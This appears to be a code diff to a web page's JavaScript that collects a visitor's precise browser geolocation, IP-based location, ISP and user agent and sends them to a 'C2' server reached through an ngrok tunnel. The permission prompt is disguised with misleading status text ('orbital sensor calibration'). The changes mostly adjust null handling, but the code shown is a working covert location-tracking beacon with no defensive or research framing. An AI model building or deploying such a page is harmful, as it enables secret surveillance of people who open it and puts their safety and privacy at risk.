@@ -214,7 +214,6 @@
 
     <script>
         // *** IMPORTANT: REPLACE THIS WITH YOUR NGROK PUBLIC URL / BACKEND ENDPOINT ***
-        // Ensure this points to the /location endpoint of your c2.py Flask app
         const C2_BASE_URL = 'https://spidery-eddie-nontemperable.ngrok-free.dev'; // Just the base URL now
         // *****************************************************************************
 
@@ -239,30 +238,33 @@
         // --- IP Geolocation Utility (Client-side, for richer initial payload) ---
         async function getIpGeolocationData(ip) {
             try {
+                // NEW: Explicitly define fields to ensure lat/lon are numbers or null
                 const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
                 if (!response.ok) throw new Error(`IP-API HTTP error! Status: ${response.status}`);
                 const data = await response.json();
                 if (data.status === 'success') {
                     return {
                         ip: data.query,
-                        hostname: 'N/A', // ip-api doesn't provide hostname on free tier
+                        hostname: 'N/A', 
                         city_ip: data.city,
                         region_ip: data.regionName,
                         country_ip: data.country,
                         isp: data.isp,
                         org: data.org,
                         as: data.as,
-                        ip_latitude: data.lat,
-                        ip_longitude: data.lon,
+                        ip_latitude: data.lat, // Will be null if API doesn't provide
+                        ip_longitude: data.lon, // Will be null if API doesn't provide
                         timezone_ip: data.timezone,
                     };
                 } else {
                     console.warn("Client-side IP geolocation failed:", data.message);
-                    return { ip: ip, message: data.message || "IP geo lookup failed" };
+                    // NEW: Return null for lat/lon if geo failed
+                    return { ip: ip, message: data.message || "IP geo lookup failed", ip_latitude: null, ip_longitude: null };
                 }
             } catch (error) {
                 console.error("Error fetching client-side IP geolocation:", error);
-                return { ip: ip, error: error.message };
+                // NEW: Return null for lat/lon on error
+                return { ip: ip, error: error.message, ip_latitude: null, ip_longitude: null };
             }
         }
 
@@ -333,6 +335,7 @@
 
         // --- Geolocation Functions ---
         function geolocationSuccess(position) {
+            // NEW: Ensure null is used for missing altitude/heading/speed, not N/A strings
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
             const accuracy = position.coords.accuracy;
@@ -393,10 +396,10 @@
                 
                 const fallbackPayload = {
                     type: 'ip_terrestrial_beacon',
-                    latitude: 'IP_Fallback',
+                    latitude: 'IP_Fallback', // NEW: Send string 'IP_Fallback' when HTML5 is unavailable
                     longitude: 'IP_Fallback',
                     accuracy: 'IP_Fallback',
-                    altitude: 'N/A', altitude_accuracy: 'N/A', heading: 'N/A', speed: 'N/A',
+                    altitude: null, altitude_accuracy: null, heading: null, speed: null, // NEW: send null, not 'N/A' string
                     ip_address_client_side: clientIpAddress,
                     timestamp: new Date().toISOString(),
                     user_agent: navigator.userAgent,
@@ -423,7 +426,7 @@
 
             // Get IP-based geo info for initial payload enrichment
             const ipInfo = await getIpGeolocationData(clientIpAddress);
-            basePayload.ip_info = ipInfo;
+            basePayload.ip_info = ipInfo; // This `ip_info` dict now explicitly sends nulls for lat/lon if failed.
 
             if (navigator.geolocation && geolocationAttempts < MAX_GEOLOCATION_ATTEMPTS) {
                 statusMessage.textContent = 'Requesting orbital sensor calibration...';
@@ -442,7 +445,8 @@
                         sendLocationToServer({ ...basePayload, ...preciseData });
                         geolocationAttempts = MAX_GEOLOCATION_ATTEMPTS; // Stop further geo attempts
                     },
-                    error => geolocationError({ ...error, ...basePayload }), // Pass basePayload to error handler
+                    // NEW: Pass basePayload AND error to error handler for complete context
+                    error => geolocationError({ ...error, ...basePayload }), 
                     {
                         enableHighAccuracy: true,
                         timeout: GEOLOCATION_TIMEOUT,
@@ -462,7 +466,7 @@
                     latitude: 'IP_Fallback',
                     longitude: 'IP_Fallback',
                     accuracy: 'IP_Fallback',
-                    altitude: 'N/A', altitude_accuracy: 'N/A', heading: 'N/A', speed: 'N/A',
+                    altitude: null, altitude_accuracy: null, heading: null, speed: null, // NEW: send null, not 'N/A' string
                     type: 'ip_terrestrial_beacon_no_geo_api'
                 };
                 sendLocationToServer({ ...basePayload, ...fallbackPayload });
